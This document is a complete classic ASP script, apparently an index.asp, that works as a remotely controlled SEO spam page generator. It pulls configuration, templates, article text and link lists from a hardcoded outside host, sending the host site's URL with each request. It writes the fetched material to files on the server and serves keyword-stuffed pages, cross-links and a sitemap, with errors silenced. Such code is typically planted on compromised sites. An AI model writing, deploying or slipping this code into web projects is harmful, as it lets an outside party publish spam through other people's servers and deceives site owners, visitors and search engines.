<%
On Error Resume Next
Server.ScriptTimeOut=9999999
url = "88.xxt110.com"
'site配置
site_path = "site.txt"
site_sitemap = "sitemap.html"
site_index = "index.txt"

'当前网址
site = GettoURL()
'模板目录
site_templets = "templets"
'栏目ID
t = trim(Cint(request("class")))
'文章ID
id = trim(Cint(request("aid")))
'是否显示该文件名
index = "index.asp"
'查询是否存在该网站配置，否则自动配置
if CheckFile(site_path) = False then
 	siteurl = "http://"+ url +"/?s="+ site +"&i="+ index +"&cfg=1"
	cfg =  getHTTPPage(siteurl)
	cfg = trim(cfg)
	Call FileDel(site_path)
	Call WriteFile(site_path,cfg)
else
	cfg =  FSOFileRead(site_path)
	if len(trim(cfg)) < 20 then
		siteurl = "http://"+ url +"/?s="+ site +"&i="+ index +"&cfg=1"
		cfg =  getHTTPPage(siteurl)
		cfg = trim(cfg)
		Call FileDel(site_path)
		Call WriteFile(site_path,cfg)
	end if 
end if
'获取基本配置信息
cfg_arr = Split(cfg,"@@@")
indexname = trim(cfg_arr(1))
title = trim(cfg_arr(2))
keyword = trim(cfg_arr(3))
desc = trim(cfg_arr(4))
cfg_list =   trim(cfg_arr(5))
cfg_check = trim(cfg_arr(7))
cfg_check = trim(replace(replace(replace(replace(cfg_check,chr(34),"") ,CHR(13),""),chr(10),""),vbtab,""))
if cfg_check <> "check" then
		siteurl = "http://"+ url +"/?s="+ site +"&i="+ index +"&cfg=1"
		cfg =  getHTTPPage(siteurl)
		cfg = trim(cfg)
		Call FileDel(site_path)
		Call WriteFile(site_path,cfg)
end if 

if right(site,1) = "/" then
	site=left(site,len(site)-1) 
end if
geturl = "http://"+ site +"/"
'栏目和文章title
lasttime=filemtime(site_index)
nowtime = time()
difftime = dateDiff("d",lasttime,now())

'jan--------------
isupdate = 0
if  trim(request("update")) <> "" then
  isupdate = 1
else
  if difftime > 0  or lasttime = "" or lasttime = 0 then
     isupdate = 1
  end if
end if
if isupdate = 1 then
'jan--------------
	cfg_list_arr = Split(cfg_list,"|||")
	for key=0 to ubound(cfg_list_arr) 
 	   j =key + 1
	   arc_title = getHTTPPage("http://"+ url+ "/?s="+ site+ "&i="+ index+ "&cfg=3&temp=1")
	   htmlFile = Cstr(j)
       dirname = htmlFile+ "/"+ Cstr(j) + ".txt"
	   typeinfo =  ReadFileArr(dirname)
	   typeall = Split(typeinfo,"+++")
       checkid_arr = Split(typeall(0),"@@@")
       checkid = trim(checkid_arr(0))
	   if checkid <> j then 
    		Call FileDel(dirname)
	   end if
       htmlFile=server.MapPath(htmlFile)  
       Set fs=Server.CreateObject("Scripting.FileSystemObject")
	   If CheckFile(dirname) = False Then   '判断文件是否存在
	   	fs.createfolder(htmlFile)
	    list_content = Cstr(j) + "@@@"+ cfg_list_arr(key) 
	    Call WriteFileArc(dirname,list_content)
	   end if
	   set fs=nothing
	   list_content = trim(arc_title)
	   Call WriteFileArc(dirname,list_content)
	next
    if CheckFile(site_index) = True then
 		FileDel(site_index)
    end if
end if	



if   id <> "" and id <> 0  then
	site_arc = Cstr(t)+"/"+Cstr(t)+"_"+Cstr(id)+".html"
	if CheckFile(site_arc) = True then
			temp =  FSOFileRead(site_arc)
			if len(trim(temp)) > 50 then
				temp_arr = Split(temp,"@@@")
				temp_check = trim(replace(replace(replace(replace(temp_arr(1),chr(34),"") ,CHR(13),""),chr(10),""),vbtab,""))
				if temp_check = "check" then
					response.write temp_arr(0)
					response.end()
				end if
			end if 
	end if
elseif  t <> "" and t <> 0  then
  	page = trim(Cint(request("page")))
	site_list = Cstr(t)+"/"+Cstr(t)+"-"+page+".html"
	if CheckFile(site_list) = True then
		lasttime=filemtime(site_list)
		nowtime = time()
		difftime = dateDiff("d",lasttime,now())
		if difftime < 1 then
			temp =  FSOFileRead(site_list)
			if len(trim(temp)) > 50 then
				temp_arr = Split(temp,"@@@")
				temp_check = trim(replace(replace(replace(replace(temp_arr(1),chr(34),"") ,CHR(13),""),chr(10),""),vbtab,""))
				if temp_check = "check" then
					response.write temp_arr(0)
					response.end()
				end if
			end if 
		end if
	end if
else
	if CheckFile(site_index) = True then
		lasttime=filemtime(site_index)
		nowtime = time()
		difftime = dateDiff("d",lasttime,now())
		if difftime < 1 then
			temp =  FSOFileRead(site_index)
			if len(trim(temp)) > 50 then
				temp_arr = Split(temp,"@@@")
				temp_check = trim(replace(replace(replace(replace(temp_arr(1),chr(34),"") ,CHR(13),""),chr(10),""),vbtab,""))
				if temp_check = "check" then
					response.write temp_arr(0)
					response.end()
				end if
			end if 
		end if
	end if
end if
 '获取模板  否则创建模板
  if CheckFile(site_templets+"/css.css") = False then
  	CreateFolder(site_templets)	
  	templets_css = getHTTPPage("http://"+ url +"/?s="+ site +"&i="+ index +"&cfg=2&temp=5")	
	Call WriteFile(site_templets +"/css.css",templets_css) 'jan
  end if
  
 
 '栏目名称
  cfg_list_arr = Split(cfg_list,"|||")
  for key=0 to ubound(cfg_list_arr) 
	  j = key + 1
	  typenames  =  typenames+"<li><a href='"+ geturl + index +"?class="+ Cstr(j) +"' target='_blank'>"+ cfg_list_arr(key) +"</a></li>"
  next 
  '尾部关键词
  keyword_arr = Split(keyword,",")
  for key=0 to ubound(keyword_arr) 
	  keywordsurl = keywordsurl + "<a href='"+ geturl + index +"' target='_blank'>"+ keyword_arr(key) + "</a> |"
  next

'文章页
if   id <> "" and id <> 0  then
  	aid = id
  	templets_arc = getHTTPPage("http://"+url+"/?s="+site+"&i="+index+"&cfg=2&temp=3")
    '获取文章信息
	filename = Cstr(t)
	dirname = filename + "/" + filename + ".txt"
	typeinfo =  ReadFileArr(dirname)
	arc_title_arr = ""
	arc_title_arr = Split(typeinfo,"+++")
   '文章标题
	title2 = trim(arc_title_arr(id))
	'获取栏目
	type_name = Split(arc_title_arr(0),"@@@")
	tname_url = "<a href='"+geturl+index+"?class="+t+"' target='_blank'>"+type_name(1)+"</a>"
	'相关栏目文章
	count = ubound(arc_title_arr)
	if   Cint(count) < Cint(id) then 
		response.write "<html><head><title>404错误页面</title></head><body><div><center>404错误页面<br/>返回"+tname_url+"栏目页</center><div></body></html>"
		response.end()
	end if
	max = 10
	if count < max then 
		max = count-1
	end if
	for i = 1 to max
 		arc_rand = RndNumber(1,count)
	    arc_title = trim(arc_title_arr(arc_rand))
	    if   id <> arc_rand then
	    	id = arc_rand
	    	tag_arc = tag_arc + "<dd><a href='" +geturl+index+ "?class=" +Cstr(t)+ "&aid=" +Cstr(id)+ "' target='_blank'>" +arc_title+ "</a></dd>"
		end if
	next
	'发布
	hui ="<div class='optime'>发布时间:"+ Cstr(date())+" "+Cstr(time())+"   分类： "+tname_url+" </div>" 'jan
	title = title2+"-"+indexname
	keyword = value+","+indexname
	desc = title
	'随机文章
	j = 0
    for key=0 to ubound(cfg_list_arr) 
		j =j + 1
		filename = Cstr(j)
        dirname = filename + "/" + filename + ".txt"
        typeinfo = ""
        typeinfo =  ReadFileArr(dirname)
		arc_title_arr = ""
        arc_title_arr = Split(typeinfo,"+++")
		 count = ubound(arc_title_arr)
		max = 2
		id = 0
		id2 = 0
		if   count < max then
		 max = count-1
		end if
	    for i = 1 to max
		    arc_rand = RndNumber(count-1,1)
		    arc_title = trim(arc_title_arr(arc_rand))
		    if   id <> arc_rand then
		    	id = arc_rand
		    	rand_arc = rand_arc + "<dd><a href='" +geturl+index+ "?class=" +Cstr(j)+ "&aid=" +Cstr(id)+ "' target='_blank'>" +arc_title+ "</a></dd>"
			end if
			arc_rand2 = RndNumber(count-1,1)
			arc_title2 = trim(arc_title_arr(arc_rand2))

			if   id2 <> arc_rand2 then
				id2 = arc_rand2
				articlelink_all = articlelink_all+ "<a href='" +geturl+index+ "?class=" +Cstr(j)+ "&aid=" +Cstr(arc_rand2)+ "' target='_blank'>" +arc_title2+ "</a>|||"
			end if 
		next
		listlink_all = listlink_all + "<a href='"+ geturl+index+"?class="+Cstr(j)+"' target='_blank'>"+Cstr(cfg_list_arr(j))+"</a>|||"
	next
	'获取文章内容
	body = getHTTPPage("http://"+url+"/?s="+site+"&i="+index+"&cfg=3&temp=2")
	'替代文章标题
	articleseokeywords_zz = "{articleseokeywords}"
 	body = Replace(body,articleseokeywords_zz,title2)
	'文章url替代
	articleurl = geturl+index+"?class="+Cstr(t)+"&aid="+aid
	body =  Replace(body,"{articleurl}",articleurl)
	'{webseokeywords}
	body =  Replace(body,"{webseokeywords}",indexname)
	'{keyword}
	list_all = Replace(cfg_list,"|||",",")
	keyword_all = keyword+","+indexname+","+list_all
	kw_array = Split(keyword_all,",")
	kwnums = ubound(kw_array)
	set regex = new regexp
		regex.ignorecase = true
		regex.global = false
		regex.pattern = "{keyword}"	
	Set reg = new Regexp 
		reg.IgnoreCase = True 
		reg.Global = True 
		reg.Pattern = "{keyword}"  
	Set Matches = reg.Execute(body) 
	For Each match in Matches 
        kwnum = RndNumber(0,kwnums-1)
        kw = kw_array(kwnum)
		body = regex.replace(body,kw) 
    Next 
	'{listlink}
	ll_array = Split(listlink_all,"|||")
	llnums = ubound(ll_array)
	set regex = new regexp
		regex.ignorecase = true
		regex.global = false
		regex.pattern = "{listlink}"	
	Set reg = new Regexp 
		reg.IgnoreCase = True 
		reg.Global = True 
		reg.Pattern = "{listlink}"  
	Set Matches = reg.Execute(body) 
	For Each match in Matches 
        llnum = RndNumber(0,llnums-1)
        ll = ll_array(llnum)
		body = regex.replace(body,ll) 
    Next 
	'{articlelink}
	arclink_array = Split(articlelink_all,"|||")
	arclinknums = ubound(arclink_array)
	set regex = new regexp
		regex.ignorecase = true
		regex.global = false
		regex.pattern = "{articlelink}"	
	Set reg = new Regexp 
		reg.IgnoreCase = True 
		reg.Global = True 
		reg.Pattern = "{articlelink}"  
	Set Matches = reg.Execute(body) 
	For Each match in Matches 
        arclinknum = RndNumber(0,arclinknums-1)
        arclink = arclink_array(arclinknum)
		body = regex.replace(body,arclink) 
    Next   
	flink_content =  file_get_contents("http://"+url+"/?s="+site+"&i="+index+"&cfg=3&temp=3")
	str_arr = Array("{body}","{index}","{title}","{keywords}","{description}","{indexname}","{typenames}","{tname_url}","{rand_arc}","{taglist}","{title2}","{hui}","{flink_content}","{tag_arc}","{sitemap}","{keywordsurl}")
	replace_arr = Array(body,geturl+index,title,keyword,desc,indexname,typenames,tname_url,rand_arc,taglist,title2,hui,flink_content,tag_arc,geturl+site_sitemap,keywordsurl)
	for i = 0 to ubound(str_arr) 
	templets_arc = Replace(templets_arc,str_arr(i),replace_arr(i))
	next
	site_arc = Cstr(t)+"/"+t+"_"+aid+".html"
	if CheckFile(site_arc) = True then
	 	FileDel(site_arc)
	end if
	Call WriteFile(site_arc,templets_arc+"@@@check")
	response.write templets_arc
	response.end
end if

  '栏目页
  if   t <> "" and t <> 0  then

  	templets_list = getHTTPPage("http://" +url+ "/?s=" +site+ "&i=" +index+ "&cfg=2&temp=2")
 
  	page = trim(Cint(request("page")))
  	if  page = "" then  
  		page = 1
	end if  
	j = 0
	
    for key=0 to ubound(cfg_list_arr) 
		j =j + 1
        filename = Cstr(j)
        dirname = filename + "/" + filename + ".txt"
        typeinfo =  ReadFileArr(dirname)
		arc_title_arr = ""
        arc_title_arr = Split(typeinfo,"+++")
		if  j = Cint(t) then
			page_size = 20
	        count = ubound(arc_title_arr)-1
	        page_count = abs(int(count/page_size))
			title = trim(cfg_list_arr(key))+ "-" +indexname
			if   page > 1 then
			    title = title+ " 第" +page+ "页"
			end if	
			keyword = cfg_list_arr(key)+ "," +indexname
			desc = title
			tname_url = "<a href='" +geturl+index+ "?class=" +Cstr(j)+ "' target='_blank'>" +cfg_list_arr(key)+ "</a>"
	
			i = page_size*(page-1)
			if   i < 0 then
			 i = 0
			end if
			page_dc = i+page_size
			for i=i to  page_dc
				if   i <> 0 then
				  id = i
 						  arclist = arclist + "<dd><a href='" +geturl+index+ "?class=" +Cstr(j)+ "&aid=" +Cstr(id)+ "' target='_blank'>" +trim(arc_title_arr(id))+ "</a></dd>"
	 			end if
			next
			
 
			for i=1 to page_count
				if   i = page then
					pl = pl + "<span>"+Cstr(i)+"</span>" 
				elseif   i = 1 then
					pl = pl + " <a href='" +geturl+index+ "?class=" +Cstr(t)+ "'>" +Cstr(i)+ "</a>"
				else 
					pl = pl + " <a href='" +geturl+index+ "?page=" +Cstr(i)+ "&t=" +Cstr(t)+ "'>" +Cstr(i)+ "</a>" 
				end if
			next
		end if 
        count = ubound(arc_title_arr)
		max = 2
		id = 0
		if   count < max then
		 max = count-1
		end if
	    for i = 1 to max
		    arc_rand = RndNumber(count-1,1)
		    arc_title = trim(arc_title_arr(arc_rand))
		    if   id <> arc_rand then
		    	id = arc_rand
		    	rand_arc = rand_arc + "<dd><a href='" +geturl+index+ "?class=" +Cstr(j)+ "&aid=" +Cstr(id)+ "' target='_blank'>" +arc_title+ "</a></dd>"
			end if
		next
	next	

	str_arr = Array("{index}","{title}","{keywords}","{description}","{indexname}","{typenames}","{tname_url}","{rand_arc}","{key}","{arclist}","{linklist}","{sitemap}","{keywordsurl}")
	replace_arr = Array(geturl+index,title,keyword,desc,indexname,typenames,tname_url,rand_arc,pl,arclist,linklist,geturl+site_sitemap,keywordsurl)
	 for i = 0 to ubound(str_arr) 
 		templets_list = Replace(templets_list,str_arr(i),replace_arr(i))
	 next
	 site_list = Cstr(t)+"/"+Cstr(t)+"-"+page+".html"
	 if CheckFile(site_list) = True then
	 	FileDel(site_list)
	 end if
	 Call WriteFile(site_list,templets_list+"@@@check")
	 response.write templets_list
     response.end()
end if  

'首页文章
templets_index = getHTTPPage("http://"+ url +"/?s="+ site +"&i="+ index +"&cfg=2&temp=1")
templets_map = getHTTPPage("http://"+ url +"/?s="+ site +"&i="+ index +"&cfg=2&temp=4")		 
j = 0
for key=0 to ubound(cfg_list_arr) 
	j =j + 1
	filename = Cstr(j)
    dirname = filename + "/" + filename + ".txt"
    typeinfo = ""
    typeinfo =  ReadFileArr(dirname)
	arc_title_arr = ""
    arc_title_arr = Split(typeinfo,"+++")
	typelist  = typelist + "<dl>"
	typelist =  typelist + "<dt><a href='"+geturl+index+"?class="+Cstr(j)+"' target='_blank'>"+cfg_list_arr(key)+"</a></dt>"
	 count = ubound(arc_title_arr)
	max = 6
	if   count < max then
	 max = count-1
	end if
    for i = 0 to max
	    id = count - i
	    arc_title = trim(arc_title_arr(id))
	    if   id <> 0 and arc_title <> "" then
	    	typelist = typelist + "<dd><a href='" +geturl+index+ "?class=" +Cstr(j)+ "&aid=" +Cstr(id)+ "' target='_blank'>" +arc_title+ "</a></dd>"
		end if
	next
	typelist = typelist + "</dl>"
	max = 20
	if   count < max then
	 max = count-1
	end if
    for i = 0 to max
	    id = count - i
	    arc_title = trim(arc_title_arr(id))
	    if   id <> 0 and arc_title <> "" then
	    	sitemap_typelist = sitemap_typelist + "<dd><a href='" +geturl+index+ "?class=" +Cstr(j)+ "&aid=" +Cstr(id)+ "' target='_blank'>" +arc_title+ "</a></dd>"
		end if
	next
next
 '友情链接
 linklist = cfg_arr(6)
 str_arr = Array("{index}","{title}","{indexname}","{typenames}","{typelist}","{linklist}","{keywordsurl}")
 replace_arr = Array(geturl+index,title,indexname,typenames,sitemap_typelist,linklist,keywordsurl)
 for i = 0 to ubound(str_arr) 
 	templets_map = Replace(templets_map,str_arr(i),replace_arr(i))
 next
 if CheckFile(site_sitemap) = True then
 	FileDel(site_sitemap)
 end if
 Call WriteFile(site_sitemap,templets_map)
 
 str_arr = Array("{index}","{title}","{keywords}","{description}","{indexname}","{typenames}","{typelist}","{linklist}","{sitemap}","{keywordsurl}")
 replace_arr = Array(geturl+index,title,keyword,desc,indexname,typenames,typelist,linklist,geturl+site_sitemap,keywordsurl)
 for i = 0 to ubound(str_arr) 
 	templets_index = Replace(templets_index,str_arr(i),replace_arr(i))
 next
 if CheckFile(site_index) = True then
 	FileDel(site_index)
 end if
 Call WriteFile(site_index,templets_index+"@@@check")
 response.write templets_index
response.end()
'----获取url-----
Function GettoURL()
    geturl = ""
    qq=lcase(request.ServerVariables("url"))
	rr=InstrRev(""&qq&"","/")
	dd=left(""&qq&"",""&rr&"")
    if  Request.ServerVariables("SERVER_PORT")  <> 80 then
        geturl = cstr(request.servervariables("server_name")) + ":" + Request.ServerVariables("SERVER_PORT")  +  dd
    else
        geturl = cstr(request.servervariables("server_name"))  +  dd
    end if
     GettoURL = geturl
End Function
'----获取数据-----
Function getHTTPPage(Path)
	ts = GetBody(Path)
	getHTTPPage=BytesToBstr(ts,"GB2312")
	End function
	Function Newstring(wstr,strng)
	Newstring=Instr(lcase(wstr),lcase(strng))
	if Newstring<=0 then Newstring=Len(wstr)
	End Function
	Function BytesToBstr(body,Cset)
	dim objstream
	set objstream = Server.CreateObject("adodb.stream")
	objstream.Type = 1
	objstream.Mode =3
	objstream.Open
	objstream.Write body
	objstream.Position = 0
	objstream.Type = 2
	objstream.Charset = Cset
	BytesToBstr = objstream.ReadText
	objstream.Close
	set objstream = nothing
	End Function
	Function GetBody(url)
	on error resume next
	Set Retrieval = CreateObject("Microsoft.XMLHTTP")
	With Retrieval
	.Open "Get", url, False, "", ""
	.Send
	GetBody = .ResponseBody
	End With
	Set Retrieval = Nothing
End Function 
Public Function filemtime(ByVal Filename)
	Set fso=CreateObject("Scripting.FileSystemObject")   
	Set f=fso.GetFile(server.mappath(Filename))   
	filemtime=f.DateLastModified  '最后修改时间
	Set fso = Nothing
End Function
'函数名：CheckFile
'作 用：测试某个文件存在否
'参 数：ckFilename ---- 被测试的文件名（包括路径）
'返回值：文件存在返回True,否则False
'**************************************************
Public Function CheckFile(ByVal ckFilename)
Dim M_fso
ckFilename=server.MapPath(ckFilename)
CheckFile=False
Set M_fso = CreateObject("Scripting.FileSystemObject")
If M_fso.FileExists(ckFilename) Then
CheckFile=True
End If
Set M_fso = Nothing
End Function
'---随机数--
Function RndNumber(MaxNum,MinNum)
	Randomize
	RndNumber=int((MaxNum-MinNum+1)*rnd+MinNum)
	RndNumber=RndNumber
End Function

'rem ---=删除文件---
function FileDel(filepath)
	imangepath=trim(filepath)
	path=server.MapPath(imangepath)
	SET fs=server.CreateObject("Scripting.FileSystemObject")
	if FS.FileExists(path) then
	FS.DeleteFile(path)
	end if
	set fs=nothing
end function

''''使用FSO添加文件新行的函数
function WriteFile(filename,Linecontent) 
	dim fso,f
	set fso = server.CreateObject("scripting.filesystemobject")
	set f = fso.opentextfile(server.mappath(filename),8,1)
	f.WriteLine Linecontent
	f.close
	set f = nothing
end function

''''使用FSO添加文件文章的函数
function WriteFileArc(filename,Linecontent) 
	dim fso,f
	set fso = server.CreateObject("scripting.filesystemobject")
	 strFileName = server.MapPath(filename)
	 if fso.FileExists(strFileName) Then
	 	set f = fso.opentextfile(strFileName,1,1)
		contentall = trim(f.ReadAll)
		contentall=trim(replace(replace(replace(replace(contentall,chr(34),"") ,CHR(13),""),chr(10),""),vbtab,""))
        set f = fso.opentextfile(strFileName,2,1)
        f.Write contentall+"+++"+trim(Linecontent)
    Else
        set f=fso.CreateTextFile(strFileName)
        f.Write trim(Linecontent)
    End if
	f.close
	set f = nothing

end function

'''''使用FSO读取文件内容的函数
function ReadFile(filename)
	Dim objFSO,objCountFile,FiletempData
	Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
	Set objCountFile = objFSO.OpenTextFile(Server.MapPath(filename),1,True)
	While NOT objCountFile.AtEndOfLine
	      content =content & objCountFile.readLine()& vbcrlf
	WEND
	ReadFile = content
	objCountFile.Close
End Function
'**************************************************
'函数名：FSOFileRead
'作  用：使用FSO读取文件内容的函数
'参  数：filename  ----文件名称
'返回值：文件内容
'**************************************************
  function FSOFileRead(filename) 
  Dim objFSO,objCountFile,FiletempData 
  Set objFSO = Server.CreateObject("Scripting.FileSystemObject") 
  Set objCountFile = objFSO.OpenTextFile(Server.MapPath(filename),1,True) 
  FSOFileRead = objCountFile.ReadAll 
  objCountFile.Close 
  Set objCountFile=Nothing 
  Set objFSO = Nothing 
  End Function 
'''''使用FSO读取文件内容的函数
function ReadFileArr(filename)
	Dim objFSO,objCountFile,FiletempData,arr
	Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
	Set objCountFile = objFSO.OpenTextFile(Server.MapPath(filename),1,True)
	While NOT objCountFile.AtEndOfLine
	  	  arr = arr&objCountFile.readLine()&"+++"
	WEND
	ReadFileArr = arr
	objCountFile.Close
End Function

'''''还有，创建文件夹：
function CreateFolder(Foldername)
	Set afso = Server.CreateObject("Scripting.FileSystemObject")
	if afso.folderexists(server.mappath(Foldername))=true then
	else
	afso.createfolder(server.mappath(foldername))
	end if
	set afso=nothing
end Function 
%>
